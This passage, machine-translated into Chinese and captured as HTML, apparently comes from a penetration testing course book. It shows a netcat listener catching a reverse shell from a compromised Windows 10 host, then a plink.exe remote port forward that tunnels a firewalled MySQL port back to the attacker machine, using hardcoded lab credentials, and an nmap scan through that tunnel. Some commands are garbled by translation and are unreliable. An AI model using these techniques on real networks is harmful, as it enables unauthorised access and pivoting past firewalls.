<div style="position:absolute;top:199435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 记下 Linux 客户端和 Windows Server 2016 IP 地址。</font></font></nobr></div>
<div style="position:absolute;top:199463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 在你的 Kali 机器上创建一个 SOCKS4 代理，通过 Linux 目标隧道。</font></font></nobr></div>
<div style="position:absolute;top:199491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.通过对Windows Server 2016机器执行成功的nmap扫描</font></font></nobr></div>
<div style="position:absolute;top:199511;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人。</font></font></nobr></div>
<div style="position:absolute;top:199539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 通过隧道执行 nmap SYN 扫描。</font><font style="vertical-align: inherit;">它有效吗？</font><font style="vertical-align: inherit;">结果准确吗？</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:199759;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="169"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 169 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:199792;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:200869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:200869;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:200869;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">610</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:199888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.3 PLINK.exe</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:199929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们使用的所有端口转发和隧道方法都围绕着</font></font></nobr></div>
<div style="position:absolute;top:199949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常在 *NIX 系统上找到的工具。</font><font style="vertical-align: inherit;">接下来，让我们研究一下如何进行端口转发</font></font></nobr></div>
<div style="position:absolute;top:199968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和基于 Windows 的操作系统上的隧道。</font></font></nobr></div>
<div style="position:absolute;top:200001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了证明这一点，假设我们在我们的测试期间获得了对 Windows 10 机器的访问权限。</font></font></nobr></div>
<div style="position:absolute;top:200020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 Sync Breeze 软件中的漏洞进行评估，并获得了系统级</font></font></nobr></div>
<div style="position:absolute;top:200040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向外壳。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lnvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:200091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:200108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 49937 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:200125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.16299.309]</font></font></nobr></div>
<div style="position:absolute;top:200142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2017 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:200176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:200195;left:262"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 645 - 从 Windows 10 机器接收反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:200225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在枚举和信息收集过程中，我们发现一个 MySQL 服务正在运行</font></font></nobr></div>
<div style="position:absolute;top:200245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 TCP 端口 3306 上。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat -anpb TCP</font></font></font></b></nobr></div>
<div style="position:absolute;top:200296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat -anpb TCP </font></font></nobr></div>
<div style="position:absolute;top:200330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动连接</font></font></nobr></div>
<div style="position:absolute;top:200364;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始本地地址    </font></font></nobr></div>
<div style="position:absolute;top:200364;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国外地址    </font></font></nobr></div>
<div style="position:absolute;top:200364;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态</font></font></nobr></div>
<div style="position:absolute;top:200381;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:80    </font></font></nobr></div>
<div style="position:absolute;top:200381;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:200381;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力</font></font></nobr></div>
<div style="position:absolute;top:200398;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[同步​​器.exe]</font></font></nobr></div>
<div style="position:absolute;top:200415;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:135    </font></font></nobr></div>
<div style="position:absolute;top:200415;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:200415;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力</font></font></nobr></div>
<div style="position:absolute;top:200432;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务端</font></font></nobr></div>
<div style="position:absolute;top:200449;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[svchost.exe]</font></font></nobr></div>
<div style="position:absolute;top:200466;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:445    </font></font></nobr></div>
<div style="position:absolute;top:200466;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:200466;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力</font></font></nobr></div>
<div style="position:absolute;top:200483;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法获取所有权信息</font></font></nobr></div>
<div style="position:absolute;top:200500;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 0.0.0.0:3306    </font></font></nobr></div>
<div style="position:absolute;top:200500;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:200500;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力</font></font></nobr></div>
<div style="position:absolute;top:200517;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[mysqld.exe]</font></font></nobr></div>
<div style="position:absolute;top:200536;left:274"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 646 - 识别在端口 3306 上运行的 MYSQL 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:200565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们想扫描这个数据库或与服务交互。</font><font style="vertical-align: inherit;">但是由于防火墙的原因，</font></font></nobr></div>
<div style="position:absolute;top:200585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们无法从 Kali 机器直接与此服务交互。</font></font></nobr></div>
<div style="position:absolute;top:200618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将传输 plink.exe, </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">594</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个基于 Windows 的命令行 SSH 客户端（PuTTY 项目的一部分）</font></font></nobr></div>
<div style="position:absolute;top:200637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标来克服这个限制。</font><font style="vertical-align: inherit;">程序语法类似于基于 UNIX 的 ssh 客户端：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Tools\port_redirection_and_tunneling&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plink.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:200689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接程序</font></font></nobr></div>
<div style="position:absolute;top:200706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Plink：命令行连接实用程序</font></font></nobr></div>
<div style="position:absolute;top:200723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发布 0.70</font></font></nobr></div>
<div style="position:absolute;top:200740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：plink [options] [user@]host [command]</font></font></nobr></div>
<div style="position:absolute;top:200757;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（“主机”也可以是 PuTTY 保存的会话名称）</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:200819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">594 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（西蒙·塔瑟姆，2002 年），http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:200947;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="170"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 170 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:200980;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:202057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:202057;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:202057;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">611</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:201092;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-V    </font></font></nobr></div>
<div style="position:absolute;top:201092;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印版本信息并退出</font></font></nobr></div>
<div style="position:absolute;top:201109;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-pgpfp 打印 PGP 密钥指纹并退出</font></font></nobr></div>
<div style="position:absolute;top:201126;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v    </font></font></nobr></div>
<div style="position:absolute;top:201126;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示详细信息</font></font></nobr></div>
<div style="position:absolute;top:201144;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-load sessname 从保存的会话加载设置</font></font></nobr></div>
<div style="position:absolute;top:201160;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ssh -telnet -rlogin -raw -serial</font></font></nobr></div>
<div style="position:absolute;top:201177;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强制使用特定协议</font></font></nobr></div>
<div style="position:absolute;top:201194;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-P 端口连接到指定端口</font></font></nobr></div>
<div style="position:absolute;top:201211;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l 用户使用指定的用户名连接</font></font></nobr></div>
<div style="position:absolute;top:201228;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-batch 禁用所有交互式提示</font></font></nobr></div>
<div style="position:absolute;top:201245;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-proxycmd 命令</font></font></nobr></div>
<div style="position:absolute;top:201262;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用“命令”作为本地代理</font></font></nobr></div>
<div style="position:absolute;top:201279;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sercfg 配置字符串（例如 19200,8,n,1,X）</font></font></nobr></div>
<div style="position:absolute;top:201296;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定串行配置（仅限串行）</font></font></nobr></div>
<div style="position:absolute;top:201313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下选项仅适用于 SSH 连接：</font></font></nobr></div>
<div style="position:absolute;top:201330;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-pw passw 使用指定密码登录</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:201347;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-D [listen-IP:]listen-port</font></font></b></nobr></div>
<div style="position:absolute;top:201364;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于动态SOCKS的端口转发</font></font></b></nobr></div>
<div style="position:absolute;top:201381;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-L [listen-IP:]listen-port:host:port</font></font></b></nobr></div>
<div style="position:absolute;top:201398;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将本地端口转发到远程地址</font></font></b></nobr></div>
<div style="position:absolute;top:201415;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R [listen-IP:]listen-port:host:port</font></font></b></nobr></div>
<div style="position:absolute;top:201432;left:206"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将远程端口转发到本地地址</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201449;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-X -x 启用/禁用 X11 转发</font></font></nobr></div>
<div style="position:absolute;top:201466;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-A -a 启用/禁用代理转发</font></font></nobr></div>
<div style="position:absolute;top:201483;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t -T 启用/禁用 pty 分配</font></font></nobr></div>
<div style="position:absolute;top:201500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:201519;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 647 - plink.exe 帮助菜单</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plink.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为 kali 用户</font><font style="vertical-align: inherit;">通过 SSH ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ssh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">连接</font><font style="vertical-align: inherit;">到我们的 Kali 机器 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.4</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:201568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l kali</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 使用密码“ilak” ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-pw ilak</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 创建</font><font style="vertical-align: inherit;">端口 1234</font><font style="vertical-align: inherit;">的远程端口转发 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:201587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.4:1234</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 到 Windows 目标 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">127.0.0.1:3306</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">上的 MySQL 端口，</font><font style="vertical-align: inherit;">使用以下内容</font></font></nobr></div>
<div style="position:absolute;top:201607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Tools\port_redirection_and_tunneling&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plink.exe -ssh -l kali -pw ilak -R 10.11.0.4：</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:201659;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1234:127.0.0.1:3306 10.11.0.4</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201678;left:235"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 648 - 尝试在未知主机上设置远程端口转发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plink 第一次连接到主机时，它会尝试在注册表中缓存主机密钥。</font><font style="vertical-align: inherit;">如果我们跑</font></font></nobr></div>
<div style="position:absolute;top:201727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rdesktop</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到Windows客户端，我们可以看到这个交互</font></font></nobr></div>
<div style="position:absolute;top:201746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">步： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:202135;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="171"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 171 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:202168;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:203245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:203245;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:203245;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">612</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:202595;left:242"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 301：处理未知主机时 PLINK 所需的交互</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，由于这很可能不适用于我们在典型反向中的交互级别</font></font></nobr></div>
<div style="position:absolute;top:202645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell，我们应该使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe /c echo y</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">将答案传送到提示符</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">从我们的</font></font></nobr></div>
<div style="position:absolute;top:202665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向shell，那么，这个命令将成功建立远程端口转发，无需任何</font></font></nobr></div>
<div style="position:absolute;top:202684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相互作用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:202719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Tools\port_redirection_and_tunneling&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe /c echo y | </font><font style="vertical-align: inherit;">plink.exe -ssh -l kali -p</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:202736;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">威拉克-R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:202753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe /c echo y | </font><font style="vertical-align: inherit;">plink.exe -ssh -l root -pw toor -R 10.11.0.4:1234:127.0.0.1:3306 1</font></font></nobr></div>
<div style="position:absolute;top:202770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:202804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali GNU/Linux 系统中包含的程序是免费软件；</font></font></nobr></div>
<div style="position:absolute;top:202821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个程序的确切分配条款在</font></font></nobr></div>
<div style="position:absolute;top:202838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/doc/*/copyright 中的单个文件。</font></font></nobr></div>
<div style="position:absolute;top:202872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali GNU/Linux 绝对不提供任何保证</font></font></nobr></div>
<div style="position:absolute;top:202889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用法律允许。</font></font></nobr></div>
<div style="position:absolute;top:202906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$  </font></font></nobr></div>
<div style="position:absolute;top:202925;left:213"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 649 - 使用 plink.exe 建立远程隧道而不需要交互</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们的隧道处于活动状态，我们可以尝试启动对目标 MySQL 端口的 Nmap 扫描</font></font></nobr></div>
<div style="position:absolute;top:202974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过我们的本地主机端口转发到 TCP 端口 1234：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:203009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap -sS -sV 127.0.0.1 -p 1234</font></font></font></b></nobr></div>
<div style="position:absolute;top:203043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-04-20 05:00 EEST 开始 Nmap 7.60 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:203059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地主机 (127.0.0.1) 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:203076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.00026 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:203111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务版本</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:203128;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1234/tcp 打开 mysql MySQL 5.5.5-10.1.31-MariaDB</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:203161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：1 个 IP 地址（1 个主机启动）在 0.93 秒内扫描</font></font></nobr></div>
<div style="position:absolute;top:203181;left:247"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 650 - 启动 nmap 以通过隧道扫描 MySQL 服务 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:203323;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="172"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 172 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:203356;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:204433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:204433;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:204433;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">613</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
